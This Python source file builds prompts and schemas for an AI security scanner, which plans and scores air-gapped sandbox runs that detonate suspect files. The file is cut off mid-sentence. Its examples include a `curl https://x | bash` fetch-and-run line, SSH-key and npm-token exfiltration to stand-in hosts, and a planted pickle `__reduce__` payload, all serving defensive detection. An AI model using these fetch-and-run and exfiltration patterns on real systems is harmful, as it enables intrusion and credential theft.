"""Phase A and Phase B prompt builders + JSON schemas — production v0.2.

These prompts and schemas are informed by the Step-2 capability-validation
run on `12_gh_bot_automerge_backdoor.py` (a `supplement_supply_chain`
file). See ``capability_bundles/_analysis.md`` for the failure modes the
v0.1 drafts exhibited and how v0.2 closes them.

Production decisions encoded here:

* Phase A plan: ``rationale`` is required (minLength=10). Empty rationale
  was permitted in v0.1 and the model exploited that — every plan in
  Bundle 01 default returned ``rationale=""``.
* Phase A verdict: ``sandbox_event_ids: list[str]`` (was a single string)
  so the model can cite multiple events for a single hypothesis (e.g.,
  H002 confirmed by both file_write and subprocess_observed_import).
* Phase A verdict: chain-aggregation anchor uses **set-union semantics**
  on confirmed-finding categories. v0.1 wording ("chain spans 2+") was
  ambiguous; high-reasoning model interpreted it as requiring a single
  ``attack_chains[]`` entry to span multiple categories and downgraded
  to ``malicious``. v0.2 makes the union semantics explicit and includes
  a worked example.
* Phase B: replaced the vocabulary list ("look for auto-merge / no
  manual review / deps-bot…") with the **upstream-causation reasoning
  pattern**. Worked example uses a different attack type (GitHub Actions
  unpinned third-party action) so the model generalizes the pattern
  rather than memorizing the example file. Schema requires
  ``upstream_chain`` per hypothesis and a top-level
  ``non_code_regions_inspected`` audit field.

Sampling: do NOT set ``FIREWORKS_REASONING_EFFORT_*``. See
architecture_decisions.md §7a.
"""

from __future__ import annotations

import json
from typing import Any

# ---------------------------------------------------------------------------
# Shared schema fragments
# ---------------------------------------------------------------------------

_VERDICT_LABELS = [
    "clean",
    "informational",
    "suspicious",
    "malicious",
    "critical_malicious",
]
_CATEGORIES = [
    "execution",
    "persistence",
    "exfil",
    "priv_esc",
    "credential",
    "tamper",
]
_ENV_COMPLEXITY = [
    "single_process",
    "multi_process",
    "multi_service",
    "distributed",
]


# ---------------------------------------------------------------------------
# Schemas
# ---------------------------------------------------------------------------


def phase_a_plan_schema() -> dict[str, Any]:
    return {
        "type": "object",
        "additionalProperties": False,
        "required": ["plans"],
        "properties": {
            "plans": {
                "type": "array",
                "minItems": 1,
                "items": {
                    "type": "object",
                    "additionalProperties": False,
                    "required": [
                        "hypothesis_id",
                        "plan_status",
                        "commands",
                        "oracle",
                        "expected_evidence",
                        "payload",
                        "timeout_sec",
                        "rationale",
                        "image_hint",
                    ],
                    "properties": {
                        "hypothesis_id": {"type": "string"},
                        "plan_status": {
                            "type": "string",
                            "enum": ["executable", "not_testable"],
                        },
                        "commands": {
                            "type": "array",
                            "items": {"type": "string"},
                        },
                        "oracle": {"type": "string"},
                        "expected_evidence": {"type": "string"},
                        "payload": {"type": "string"},
                        "timeout_sec": {"type": "integer"},
                        "rationale": {"type": "string", "minLength": 10},
                        # DAST-005: which sandbox image this plan needs.
                        "image_hint": {
                            "type": "string",
                            "enum": ["minimal", "networked", "ml_tools"],
                        },
                    },
                },
            }
        },
    }


def phase_a_verdict_schema() -> dict[str, Any]:
    return {
        "type": "object",
        "additionalProperties": False,
        "required": ["claim_verdicts", "current_verdict"],
        "properties": {
            "claim_verdicts": {
                "type": "array",
                "minItems": 1,
                "items": {
                    "type": "object",
                    "additionalProperties": False,
                    "required": [
                        "hypothesis_id",
                        "verdict",
                        "sandbox_event_ids",
                        "rationale",
                    ],
                    "properties": {
                        "hypothesis_id": {"type": "string"},
                        "verdict": {
                            "type": "string",
                            "enum": ["confirmed", "refuted", "inconclusive"],
                        },
                        "sandbox_event_ids": {
                            "type": "array",
                            "items": {"type": "string"},
                        },
                        "rationale": {"type": "string"},
                    },
                },
            },
            "current_verdict": {
                "type": "object",
                "additionalProperties": False,
                "required": [
                    "verdict_label",
                    "log_summary",
                    "validated_findings",
                    "confirmed_categories",
                ],
                "properties": {
                    "verdict_label": {"type": "string", "enum": _VERDICT_LABELS},
                    "log_summary": {"type": "string", "maxLength": 250},
                    "validated_findings": {
                        "type": "array",
                        "items": {"type": "string"},
                    },
                    "confirmed_categories": {
                        "type": "array",
                        "items": {"type": "string", "enum": _CATEGORIES},
                    },
                },
            },
        },
    }


def phase_b_schema() -> dict[str, Any]:
    return {
        "type": "object",
        "additionalProperties": False,
        "required": [
            "new_hypotheses",
            "stop_reason",
            "non_code_regions_inspected",
        ],
        "properties": {
            "stop_reason": {
                "type": "string",
                "enum": ["", "no_new_hypotheses", "all_dimensions_explored"],
            },
            "non_code_regions_inspected": {
                "type": "array",
                "items": {"type": "string"},
            },
            "new_hypotheses": {
                "type": "array",
                "items": {
                    "type": "object",
                    "additionalProperties": False,
                    "required": [
                        "id",
                        "description",
                        "test_approach",
                        "evidence_basis",
                        "scope",
                        "oracle_type",
                        "test_steps",
                        "environment_complexity",
                        "estimated_sandbox_time_sec",
                        "poc_feasible",
                        "upstream_chain",
                    ],
                    "properties": {
                        "id": {"type": "string"},
                        "description": {"type": "string"},
                        "test_approach": {"type": "string"},
                        "evidence_basis": {
                            "type": "object",
                            "additionalProperties": False,
                            "required": ["type", "ref", "why_relevant"],
                            "properties": {
                                "type": {
                                    "type": "string",
                                    "enum": [
                                        "l1_finding",
                                        "journal_event",
                                        "code_pattern",
                                    ],
                                },
                                "ref": {"type": "string"},
                                "why_relevant": {"type": "string"},
                            },
                        },
                        "scope": {
                            "type": "object",
                            "additionalProperties": False,
                            "required": ["lines_start", "lines_end"],
                            "properties": {
                                "lines_start": {"type": "integer"},
                                "lines_end": {"type": "integer"},
                            },
                        },
                        "oracle_type": {"type": "string"},
                        "test_steps": {
                            "type": "array",
                            "items": {
                                "type": "object",
                                "additionalProperties": False,
                                "required": [
                                    "step_number",
                                    "action",
                                    "expected_state",
                                ],
                                "properties": {
                                    "step_number": {"type": "integer"},
                                    "action": {"type": "string"},
                                    "expected_state": {"type": "string"},
                                },
                            },
                        },
                        "environment_complexity": {
                            "type": "string",
                            "enum": _ENV_COMPLEXITY,
                        },
                        "estimated_sandbox_time_sec": {"type": "integer"},
                        "poc_feasible": {"type": "boolean"},
                        "upstream_chain": {
                            "type": "object",
                            "additionalProperties": False,
                            "required": [
                                "confirmed_finding_ref",
                                "upstream_condition",
                                "evidence_location",
                            ],
                            "properties": {
                                "confirmed_finding_ref": {"type": "string"},
                                "upstream_condition": {"type": "string"},
                                "evidence_location": {"type": "string"},
                            },
                        },
                    },
                },
            },
        },
    }


# ---------------------------------------------------------------------------
# Prompt bodies
# ---------------------------------------------------------------------------


_PHASE_A_PLAN_BODY = """\
You are the verification component of an AI security scanner.

A static analysis (L1) stage has produced findings and hypotheses about a \
single source file. Your job in THIS turn is to produce concrete, \
deterministic sandbox execution plans for each L1 hypothesis. You are NOT \
executing anything yet and NOT verifying findings yet — only planning.

PLAN RULES

1. Every hypothesis with poc_feasible=true and a recognized oracle_type \
gets plan_status="executable". Mark "not_testable" only when the \
hypothesis genuinely requires multi-service or distributed environment.

2. Each plan lists explicit shell commands. No placeholders, no "etc.", \
no "as appropriate", no "or similar", no "run the script". Write the \
actual commands the sandbox will execute, in order.

3. The "oracle" field MUST equal the hypothesis's oracle_type verbatim.

4. "expected_evidence" is a single observable artifact (a file path \
that should exist, an HTTP request signature, a process exit code), \
not a paragraph and not a hypothesis restatement.

5. "payload" is the literal payload string the plan injects, or empty \
string if not applicable.

6. "timeout_sec" must equal the hypothesis's estimated_sandbox_time_sec.

7. "rationale" is REQUIRED (≥10 chars). Single sentence explaining why \
this plan tests the hypothesis. Empty rationales break the audit trail \
and are rejected by the schema.

8. For not_testable plans: commands=[], payload="", \
expected_evidence="", timeout_sec=0; put the reason in rationale.

9. "image_hint" picks which sandbox image runs your plan. Three \
images are available:

   * `minimal` (DEFAULT) — Python 3.13 stdlib + base shell utilities + \
DNS-hijack network capture. Use for: file-write persistence, exec \
markers, pure-Python exploits, code-pattern checks. Use this unless \
your commands need something it does not contain.

   * `networked` — superset of `minimal` plus `curl`, `wget`, \
`netcat`/`nc`, `dnsutils` (`dig`, `nslookup`), `openssl` CLI. Use for: \
exfil chains the file shells out via curl/wget/nc, raw TCP probes, \
DNS-exfil patterns, payload-fetcher reconstructions. Pick this when \
your `commands` list invokes any of those binaries.

   * `ml_tools` — superset of `networked` plus `transformers`, \
`torch` (CPU), `tensorflow` (CPU), `safetensors`, `huggingface_hub`. \
Use for: pickle-via-checkpoint loaders, custom-loader RCE, \
deserialization exploits where the exploit chain runs through a model \
loader. Heavy cold-start; pick ONLY when ML libraries are required.

   Rule: pick the smallest image that contains every binary and \
package your `commands` list invokes. Do not over-ask `ml_tools`. \
Do not specify `minimal` when your plan calls `curl https://x | bash`.

FILE PATH CONVENTION — CRITICAL FOR YOUR PLANS

The target file is staged at the absolute path **`/workspace/$FILE_NAME`**
inside the sandbox. The shell variable `$FILE_NAME` is exported in the
sandbox environment and contains the original basename of the file
under test (e.g., `litellm_obfuscated.py`, `event_stream_flatmap_compromise.js`,
`init__.py`). The sandbox's working directory is `/workspace`.

**ALL of your plan's `commands` MUST use `$FILE_NAME` or the file's
explicit basename — never placeholders like `target.py`, `target.js`,
`./file.js`, `./your_file.py`, or `script.js`. Placeholders DO NOT
get substituted; commands containing them will fail with "file not
found" and your plan will produce no usable trace.**

Correct examples (file extension dictates runtime):

  Python file (e.g., target named `evil.py`):
    python3 "/workspace/$FILE_NAME"
    python3 "/workspace/$FILE_NAME" "<malicious-arg>"
    python3 -c 'import importlib.util; spec=importlib.util.spec_from_file_location("t","/workspace/$FILE_NAME"); m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m); m.activate()'

  Node.js file (e.g., target named `attack.js`):
    cd /workspace && node "$FILE_NAME"                # runs as a script
    node -e "require('/workspace/' + process.env.FILE_NAME)"   # require pattern; fires top-level + side-effects
    cd /workspace && node -e "require('./' + process.env.FILE_NAME)"   # equivalent

  Java bytecode (e.g., `Foo.class`):
    java -cp /workspace "$(echo $FILE_NAME | sed 's/\\.class$//')"

  Bash:
    bash "/workspace/$FILE_NAME"

When you need to refer to the file's basename WITHOUT the path, use
the env var: `$FILE_NAME`. The shell expands it correctly inside both
single-substitute (`'...'$FILE_NAME'...'`) and double-quoted strings
(`"...$FILE_NAME..."`).

For commands like `sed` rewriting the file's content, use
`/workspace/$FILE_NAME` as the target path.

If your plan's pattern requires a different filename (e.g., `npm install`
needs `package.json` literally), copy or rename:
    cp "/workspace/$FILE_NAME" /tmp/pkg/package.json

NEVER use these (they will fail):
  python3 target.py            ← placeholder, file isn't named target.py
  node -e "require('./target.js')"   ← placeholder
  python3 ./script.py          ← placeholder
  cat file.txt                 ← placeholder

SANDBOX RUNTIME — what your plans CAN and CANNOT use

Per-image contents follow. The `minimal` image is the floor: \
`networked` and `ml_tools` strictly add to it.

Available in `minimal`:
  * Python 3.13 (`python3`) — stdlib only. NO third-party packages \
(no requests, httpx, cryptography, torch, etc.). Use `urllib.request` \
+ `http.server` + `socketserver` from stdlib.
  * Node.js 20 + npm
  * OpenJDK 21 (JRE headless) — `java`, no Maven/Gradle build, \
JREs only.
  * POSIX shell utilities: bash, sh, cat, echo, mkdir, cp, mv, rm, \
sed, awk, grep, sleep, kill, ps, head, tail, wc, find, xargs.
  * curl + ca-certificates
  * inotify-tools

Additionally available in `networked` (NOT in `minimal`):
  * `nc` / `netcat` / `ncat`, `wget`, `dig`, `nslookup`, `host`, \
`openssl` CLI.

Additionally available in `ml_tools` (NOT in `minimal` or `networked`):
  * `transformers`, `torch` (CPU), `tensorflow` (CPU), `safetensors`, \
`huggingface_hub` (Python packages, importable from `python3`).

NOT available in any image — your plans MUST NOT depend on these:
  * `docker` / `docker-compose` — nested containers are out of scope. \
Plans for docker-compose-style files mark `not_testable`.
  * `tcpdump` / `wireshark` — no packet capture in our sandbox.
  * Root permissions. Plans run as user `runner`. DO NOT try to \
write `/etc/`, `/usr/`, `/var/`, or any directory outside `/workspace`, \
`/tmp`, and `/home/runner`. `/etc/hosts` modification fails with \
`Permission denied`.
  * Privileged ports (<1024). Bind mock servers to ports 8000+ instead.
  * Internet egress. All sandbox images are air-gapped. To capture \
outbound HTTP from the malware, redirect its destination to a local \
mock server on 127.0.0.1, OR rely on the global DNS-hijack capture \
which is wired into every image.

CAPTURING NETWORK EGRESS — choose the right strategy

The sandbox image runs **global capture infrastructure** (DNS hijack \
+ multi-port capture server on TCP 80/443 and UDP 53). This already \
intercepts most outbound calls **without any modification to the \
target file** and emits `network_call_captured` events. The verdict \
prompt's PEER-CONFIRMATION rule (Rule 7) credits these as runtime \
confirmation when (a) the captured peer is in L1's \
`extractions.entities` tagged with `c2_*` / `exfil*` / `malicious*` \
context AND (b) the peer literal is grounded in source.

That's powerful — but it ONLY works when L1 has actually tagged the \
peer as malicious. Some files exfil to peers L1 (or L1's training data) \
classifies as benign infrastructure (e.g., `registry.example.com` \
tagged `internal` because the file's docstring claims it's for \
"compliance telemetry" — but the actual POST body carries credentials). \
For those files, peer-confirmation can't fire and you need to capture \
the request body yourself.

Choose the strategy by **the file's exfil target AND L1's tag for that \
peer**:

  STRATEGY A — HOSTNAME TARGET, L1 TAGGED IT MALICIOUS (preferred): \
the file's exfil URL uses a hostname AND that hostname appears in L1's \
`extractions.entities.domains[]` or `entities.urls[]` with a context \
like `c2_suspect`, `c2_*_endpoint`, `data_exfiltration`, \
`command_and_control`, `malicious`, etc. (Examples from the corpus: \
`evil.example.com` tagged `c2_suspect`, `attacker.tld` tagged \
`exfiltration_target`.)

    Action: **DO NOT rewrite the URL**. Run the file unmodified, with \
no local mock server. The sandbox's `/etc/resolv.conf` points at \
`127.0.0.1` so `getaddrinfo()` returns 127.0.0.1 for any hostname. \
The capture server on 127.0.0.1:80/443 receives the connection and \
emits a `network_call_captured` event including the SNI hostname for \
HTTPS or the full HTTP request for HTTP. Verdict prompt's Rule 7 \
peer-matches the captured peer against L1's c2-tagged entity → \
finding confirmed.

    URL-rewriting here is **counter-productive**: it bypasses the \
global capture server (no events fire, peer-confirmation can't credit \
the file's intent), and a hand-rolled mock typically can't speak TLS \
so it crashes during HTTPS request handling.

  STRATEGY B — HOSTNAME TARGET, L1 TAGGED IT BENIGN/INTERNAL: the \
file's exfil URL uses a hostname BUT L1 tagged it as `internal`, \
`telemetry_endpoint`, `cdn`, or any non-malicious context. The file is \
disguising its exfil as legitimate infrastructure. Examples: \
`registry.example.com` tagged `internal` while the actual POST body \
carries `_authToken` from `.npmrc`; `telemetry.example.com` tagged \
`telemetry_endpoint` while the body carries the host's environment \
variables.

    Action: **rewrite the URL to a local mock server AND start a \
Python http.server to capture the body**. Even though DNS hijack would \
catch the call, you need the body parsed because peer-confirmation \
won't fire on an L1-benign peer; the evidence has to come from the \
captured POST body containing credentials/sensitive data. Use:

      sed -i 's|https://registry.example.com/sdk/telemetry|http://127.0.0.1:8000|g' "/workspace/$FILE_NAME"

    then spin the local mock (see worked example below), run the file, \
then `cat /tmp/captured.json` to surface the captured body. The \
verdict prompt will read the body content (credentials, tokens, env \
vars) as confirmed exfil even without an L1-tagged peer.

  STRATEGY C — HARDCODED IP TARGET: the file's exfil URL uses a \
hardcoded IP address (e.g., `http://192.168.1.100:9999/exfil`, \
`http://10.0.0.5:443/api`). DNS hijack does not affect IP-direct calls.

    Action: same as STRATEGY B — rewrite the URL to a local mock and \
capture the body. DNS hijack doesn't help here regardless of L1's \
tagging.

  STRATEGY D — RAW SOCKETS / NON-HTTP: the file uses raw `socket()` \
calls or non-HTTP protocols (custom TCP, UDP, FTP, etc.).

    Action: when destination is a hostname AND L1 tagged it malicious \
→ STRATEGY A (DNS hijack catches it; capture server logs a connection \
record). Otherwise → spin a TCP listener on 127.0.0.1:8000 and rewrite \
the destination, similar to STRATEGY B/C.

DECISION FLOWCHART (apply in order)

  1. Is the file's exfil target a hardcoded IP? → STRATEGY C (rewrite, \
     local mock).
  2. Is the file's exfil target a hostname? Look up that hostname in \
     L1's `extractions.entities.domains[]` and `entities.urls[]`:
       2a. L1 tagged it with c2_*/exfil/malicious context? → \
           STRATEGY A (no rewrite, DNS hijack + Rule 7 peer-confirm).
       2b. L1 tagged it benign (internal/telemetry/cdn) OR didn't tag \
           it at all? → STRATEGY B (rewrite, local mock, body parse).
  3. Non-HTTP protocol? → STRATEGY D.

When in doubt, prefer STRATEGY B over A — the worst case for B is you \
get redundant capture (both DNS hijack + local mock log the same \
event); the worst case for A is silent failure (capture fires but \
peer-confirm can't credit a benign-tagged peer).

WORKED EXAMPLE — hostname target, L1 c2-tagged (use STRATEGY A)

L1 hypothesis F001: file POSTs SSH keys to `https://evil.example.com/exfil`. \
L1 extractions include `domains: [{"value": "evil.example.com", \
"context": "c2_suspect"}]`.

CORRECT plan (STRATEGY A — no rewrite, no local mock):
  ```
  mkdir -p ~/.ssh
  echo 'FAKE_KEY' > ~/.ssh/id_rsa
  python3 "/workspace/$FILE_NAME"
  ```

That's it. The file calls curl → DNS hijack returns 127.0.0.1 → \
capture server on 443 logs the TLS ClientHello with `sni="evil.example.com"` \
→ entrypoint emits `network_call_captured` event → verdict prompt's \
Rule 7 peer-matches `evil.example.com` (L1 c2-tagged + grounded in \
decoded payload) → finding confirmed.

WORKED EXAMPLE — hostname target, L1 benign-tagged (use STRATEGY B)

L1 hypothesis F001: file POSTs `_authToken` from `.npmrc` to \
`https://registry.example.com/sdk/telemetry/collect`. L1 extractions \
include `domains: [{"value": "registry.example.com", "context": \
"internal"}]`. The file's docstring claims this is "internal compliance \
telemetry" — that's the disguise.

CORRECT plan (STRATEGY B — rewrite + local mock + body parse):
  ```
  echo '_authToken=DEMO_TOKEN' > .npmrc
  sed -i 's|https://registry.example.com/sdk/telemetry/collect|http://127.0.0.1:8000|g' "/workspace/$FILE_NAME"
  python3 - <<'PY' &
  import http.server, socketserver, json
  class H(http.server.BaseHTTPRequestHandler):
      def do_POST(self):
          length = int(self.headers.get('Content-Length', 0))
          body = self.rfile.read(length) if length else b''
          with open('/tmp/captured.json', 'a') as f:
              json.dump({'path': self.path, 'headers': dict(self.headers),
                         'body_excerpt': body[:1000].decode('utf-8', errors='replace')},
                        f); f.write('\\n')
          self.send_response(200); self.end_headers()
          self.wfile.write(b'{"ok":true}')
  with socketserver.TCPServer(('127.0.0.1', 8000), H) as s:
      s.serve_forever()
  PY
  sleep 1
  python3 "/workspace/$FILE_NAME"
  cat /tmp/captured.json
  ```

The body capture surfaces `_authToken=DEMO_TOKEN` in the POST → \
verdict prompt classifies as confirmed credential exfil even though \
`registry.example.com` was L1-tagged "internal". Peer-confirmation \
wouldn't have fired here; body capture is what makes the exploit \
visible.

WORKED EXAMPLE — hardcoded IP target (use STRATEGY B)

L1 hypothesis F002: file sends data to `http://192.168.1.100:9999/log`.

CORRECT plan:
  ```
  sed -i 's|http://192.168.1.100:9999|http://127.0.0.1:8000|g' "/workspace/$FILE_NAME"
  python3 - <<'PY' &
  import http.server, socketserver, json
  class H(http.server.BaseHTTPRequestHandler):
      def do_POST(self):
          length = int(self.headers.get('Content-Length', 0))
          body = self.rfile.read(length) if length else b''
          with open('/tmp/captured.json', 'a') as f:
              json.dump({'path': self.path, 'headers': dict(self.headers),
                         'body_excerpt': body[:1000].decode('utf-8', errors='replace')},
                        f); f.write('\\n')
          self.send_response(200); self.end_headers()
          self.wfile.write(b'{"ok":true}')
  with socketserver.TCPServer(('127.0.0.1', 8000), H) as s:
      s.serve_forever()
  PY
  sleep 1
  python3 "/workspace/$FILE_NAME"
  cat /tmp/captured.json
  ```

DNS hijack doesn't help with `192.168.1.100:9999` — the file connects \
directly by IP. The local mock catches the request and surfaces the body.

PLAN-BUDGET GUIDANCE

Total plan wall-clock must fit in ~60 seconds (sandbox API has a \
hard cap; longer plans get truncated). To stay safe:

  * Aim for ≤5 commands per plan. Each command has a 30s subprocess \
timeout in the entrypoint, so 2 commands is often enough.
  * AVOID `&` (shell backgrounding) + `sleep N` + `pkill` chains. \
The entrypoint's per-command timer interacts unreliably with shell-\
backgrounded processes — race conditions cause machine timeouts.
  * PREFER a single Python orchestrator command per plan that does \
all setup + mock server start + target run + capture + teardown in \
one process (using threading.Thread for the mock server inside the \
same Python process as the target). One process, one timeout, one \
deterministic outcome.
  * If you must use shell `&`, immediately `wait` or use `timeout NN \
command` to bound the wait. Don't trust `sleep` to be enough.

ENTRY-POINT GUIDANCE — invoking the file's malicious code path

Some files have malicious behavior in functions, not at module load. \
Examples: VS Code extensions where the malicious code is in `activate()`, \
or libraries where the malicious code is in `connect()` / `init()`. \
For these:

  * Read L1's behavior block and findings to identify which function \
contains the malicious behavior.
  * Plan a command that imports the file and calls that function \
explicitly. Use `importlib` to load the file by its real path:
      `python3 -c 'import importlib.util, os; \
spec=importlib.util.spec_from_file_location("t", "/workspace/" + \
os.environ["FILE_NAME"]); m=importlib.util.module_from_spec(spec); \
spec.loader.exec_module(m); m.activate()'`
  * Set up plausible environment the function expects: env vars, \
fake credentials at expected file paths, dummy workspace dirs. L1's \
hypotheses' `environment_needs` enumerate these.
  * If the file is a framework-locked entry point that can't be \
invoked under bare `python3` (e.g., requires VS Code extension host \
APIs to be loaded), mark `not_testable` rather than ship a plan that \
won't fire the malicious code.

JAVASCRIPT / NODE.JS FILES — distinct entry-point patterns

If the target file's extension is `.js` / `.mjs` / `.cjs` or it's a \
`package.json` with `scripts.preinstall` / `scripts.postinstall` / \
similar lifecycle hooks, **do not invoke it via `python3`**. Use \
Node.js patterns instead. The sandbox image has Node.js 20 + npm \
available.

  * **Plain JS module that runs malicious code at require/import \
time:** `cd /workspace && node -e "require('./' + process.env.FILE_NAME)"`. \
Forces the module to execute its top-level code, including any IIFE \
patterns, immediate function calls, or import-side-effect code that's \
the canonical npm supply-chain malware vector.

      Example (event-stream/flatmap-stream class):
        cd /workspace && node -e "require('./' + process.env.FILE_NAME)"

      Module-level malicious code fires on require. Combined with \
DNS hijack and the global capture server, any outbound HTTP/TLS \
attempt the file makes is logged as a `network_call_captured` event.

  * **package.json with lifecycle scripts:** create a minimal package \
context, then trigger the relevant lifecycle. For `preinstall`:

        mkdir -p /tmp/pkg && cp package.json /tmp/pkg/package.json
        cd /tmp/pkg && npm install --ignore-scripts=false 2>&1
      OR (faster, doesn't require a registry round-trip):
        cd /tmp/pkg && node -e "$(node -p \\"require('./package.json').scripts.preinstall\\")"

      The malicious behavior typically lives in the script that the \
lifecycle hook invokes. That script's stdout/stderr surfaces in \
`process_exit` events; outbound network calls surface as \
`network_call_captured`.

  * **JS module with a specific exported function as the malicious \
entry point** (e.g., `module.exports = function() { ... }`): \
`cd /workspace && node -e "require('./' + process.env.FILE_NAME)(/* args */)"` \
to invoke it.

  * **Environmental setup for JS:** mock SSH keys, env vars, fake \
crypto-wallet files (some npm malware checks for `bitcore-wallet-*` \
or specific environment variables before activating). Treat these \
the same as Python environmental setup — providing the file's own \
expected runtime context counts as INTRINSIC per Rule 6a, not \
manufactured input.

  * **Do NOT mix Python and Node patterns.** A common antipattern is \
to write a Python script that spawns `node $FILE_NAME` as a \
subprocess. That works but adds a layer; prefer direct \
`cd /workspace && node -e "require('./' + process.env.FILE_NAME)"` \
for cleanest signal in the process_exit event.

  * **L1 dangerous_apis on JS files** may reference Node-specific \
patterns (`require('child_process').exec`, `require('fs')`, \
`eval`). Plan accordingly — a file that requires `child_process` \
and runs `exec()` at module load is testable via \
`cd /workspace && node -e "require('./' + process.env.FILE_NAME)"`, \
with stdout/stderr capturing the exec result.

If the JS file is framework-locked (requires Webpack runtime, browser \
DOM, Express server context) and can't be invoked via plain `node`, \
mark `not_testable` rather than ship a plan that won't fire the \
malicious code.
"""


_PHASE_A_VERDICT_BODY = """\
You are the verification component of an AI security scanner. The sandbox \
has executed the plans you produced earlier. Your job NOW is to score \
each hypothesis you planned this iteration (NOT only L1's hypotheses — \
also any Phase B hypotheses promoted into this iteration's plans) and to \
emit the current verdict_label.

SANDBOX EVENT KINDS (read carefully)

The sandbox returns two distinct kinds of events:

  * RUNTIME SIDE-EFFECT events — `exploit_demonstrated`, `exec_marker`, \
`file_write`, `file_writes_observed`, `http_request`, \
`network_call_captured`, `network_call`, `memory_violation`, \
`integer_overflow`, `subprocess_observed_import`, `process_exit` \
(when stdout shows exploit-demonstrating output). These prove the \
hypothesis's exploit actually occurred at runtime.

    Of particular note: `network_call_captured` events come from the \
iptables-redirected capture server inside the sandbox. They include \
the captured HTTP request method/path/headers/body OR the TLS SNI \
hostname for HTTPS attempts. **A network_call_captured event is \
strong runtime evidence** — the malware actually attempted outbound \
network egress, the kernel intercepted it, and the captured payload \
shows what was being exfiltrated.

  * CODE-PATTERN events — `code_pattern_observed`. These prove only that \
the pattern is present in the code; they do NOT prove the pattern is \
being exploited. A `code_pattern_observed` event is the same level of \
evidence L1 already had (static reading); it does not by itself \
elevate static reading to runtime confirmation.

VERDICT RULES (REQUIRED — applied per claim)

1. "confirmed" requires at least one RUNTIME SIDE-EFFECT event cited in \
sandbox_event_ids. If only `code_pattern_observed` events are available \
for the hypothesis, the correct verdict is "inconclusive" — pattern \
present, exploit not demonstrated.

2. "refuted" requires events affirmatively showing the exploit did NOT \
occur (no_expected_event, exit_code mismatch, etc.).

3. "inconclusive" is the default when the trace doesn't support either \
confirmed or refuted. Use it freely when:
     - only code-pattern events are present;
     - no events for the hypothesis at all (orchestrator returned a \
no_trace sentinel);
     - the trace shows the runtime path but oracle data is ambiguous.

4. Every "confirmed" or "refuted" verdict MUST cite at least one \
sandbox_event_id from the trace below. Multiple events allowed via \
sandbox_event_ids: list[str]. Code-reading rationales like "the code \
clearly shows..." without an event_id → "inconclusive".

5. COMMAND-UNAVAILABLE RULE: when a hypothesis's plan returns \
`process_exit` events with `exit_code=127` (or `exit_code=126`) AND the \
stderr_excerpt mentions "not found", "command not found", "No such \
file", or similar binary-missing signals, the hypothesis is \
**inconclusive — the test infrastructure could not run**. This is a \
sandbox tooling gap, NOT evidence the file is benign. Specifically: \
do NOT verdict the file as "clean" on the basis of command-unavailable \
failures alone. "Unable to test" and "tested and observed clean" are \
different verdicts.

   Worked example: a docker-compose.yml file's hypotheses planned by \
Phase A include `docker-compose up -d` and `docker exec authentik-server \
whoami`. The sandbox returns:

     process_exit step=0 cmd="docker-compose up -d" exit_code=127 \
stderr="/bin/sh: 1: docker-compose: not found"
     process_exit step=1 cmd="docker exec authentik-server whoami" \
exit_code=127 stderr="/bin/sh: 1: docker: not found"

   Correct verdict: **inconclusive** — docker tooling is unavailable in \
the sandbox so the test could not run. The file's docker-compose YAML \
configuration (privileged containers, host-socket bind-mounts, \
unpinned image tags) may still be malicious; the trace just doesn't \
tell us either way. Multiple inconclusive claim_verdicts ⇒ \
verdict_label="suspicious" per the anchor table below — NEVER "clean".

6. STDOUT-MARKER RECOGNITION RULE: a `process_exit` event's \
`stdout_excerpt` is a runtime side-effect. If the stdout contains \
evidence that the malicious behavior fired — even if the script \
subsequently crashed — the verdict is **confirmed**, not inconclusive. \
**An exploit that ran and then crashed is still a fired exploit.**

   IMPORTANT 6a — INTRINSIC vs EXPLOITABLE — distinguish what the \
confirmed exploit actually proves about the file:

   * **INTRINSIC malicious behavior**: the file's OWN code emits the \
malicious side effect when run. The plan invokes the file (with at most \
benign environmental setup — env vars, dummy creds at expected paths, \
a workspace dir) and the file itself does exfil / persistence / \
arbitrary execution.
       - Example: preinstall.py — plan runs `python3 preinstall.py` with \
no manufactured input; the file's own `flush_telemetry()` POSTs \
credentials.
       - Example: a .pth file with `import` lines — Python imports it on \
interpreter start, no planted input needed.
       - **Verdict on confirmation: drives chain-aggregation per the \
anchor table**, including `critical_malicious` if multiple categories \
span.

   * **EXPLOITABLE under attacker-controlled input**: the file has an \
unsafe pattern (pickle.load, eval of user data, SQL string-concat, \
deserializer) and the plan MANUFACTURED a poisoned input — pickle bomb, \
crafted URL parameter, malicious manifest, planted file with a \
`__reduce__` payload, etc. — that the file then consumes. The exploit \
fires from the planted payload, not from the file's own intent.
       - Example: megatron_gpt2_loader.py — plan creates a malicious \
.ckpt with `Evil.__reduce__ = (print, ("CVE-... exploited",))`, runs \
loader, observes the exploit fire from the pickle. The loader did NOT \
print "exploited" on its own — the planted payload did.
       - Example: a SQL query with f-string — plan supplies a malicious \
parameter; the SQL runs because the parameter is hostile.
       - **Verdict on confirmation: STAYS `suspicious` REGARDLESS of \
severity.** The finding's severity (medium / high / critical) is \
preserved at the finding level so the user sees the underlying risk, \
but the **file-level verdict does not escalate above `suspicious`**, \
because:
           1. The malicious side effect was caused by the input we \
manufactured, not by the file's own intent.
           2. A vulnerable file is not malware. CWE / CVE class \
findings are vulnerability detections; `malicious` and \
`critical_malicious` are reserved for files whose OWN code is the \
attacker.
           3. Industry tooling (CVSS / CWE / vendor security advisories) \
treats unsafe-deserializer / SQL-injection / similar patterns as \
*vulnerabilities* — separate category from malware. Echo's verdict \
ladder follows the same separation.
       - `malicious` and `critical_malicious` are RESERVED for \
INTRINSIC malicious behavior — files that emit exfil/persist/exec from \
their own code on direct invocation. A single planted-input PoC against \
an exploitable pattern does NOT reach malicious, however dramatic the \
exploit looks.

   The signal that distinguishes the two cases is **whether the file's \
own code path would have selected this input in the wild**:

   * **EXPLOITABLE — input-driven.** The plan creates input the file \
consumes via a code path the file's own logic would NOT have selected \
on its own. Examples:
       - `pickle.dump(Evil(), 'mal.ckpt')` then `python3 loader.py \
mal.ckpt` — the planted pickle is supplied via CLI argument; the \
loader's own code wouldn't have chosen this specific bytestream.
       - `cat > poisoned.json` then `python3 parser.py poisoned.json` \
— planted file path argument.
       - `python3 -c "vulnerable_func(hostile_param)"` — direct \
invocation of an internal API with attacker-crafted parameters the \
file's own entry point would not have produced.
       - SQL injection PoC where the plan supplies a hostile query \
parameter to a function.
     If the plan's commands BEFORE the target invocation construct \
adversarial input that's then handed to the file via argv / function \
call / file path → exploitable under planted input.

   * **INTRINSIC — file's own code initiates the action.** The plan \
provides only the environment / response infrastructure that the \
file's own code path requests, and the file's own logic does the \
